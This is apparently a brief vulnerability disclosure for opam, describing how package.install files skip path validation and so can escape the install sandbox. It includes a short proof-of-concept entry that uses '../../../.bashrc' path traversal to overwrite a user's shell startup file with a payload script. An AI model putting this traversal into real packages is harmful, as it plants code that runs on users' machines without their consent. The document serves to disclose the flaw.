# opam install sandbox escape

## Summary

`.install` files do not validate whether they are inside the package area, and so can bypass sandboxing.

## Exploit

In a `package.install` file, this installs a file as ``~/.bashrc`:
```
bin: [
  "payload.sh" {"../../../.bashrc"}
]
```
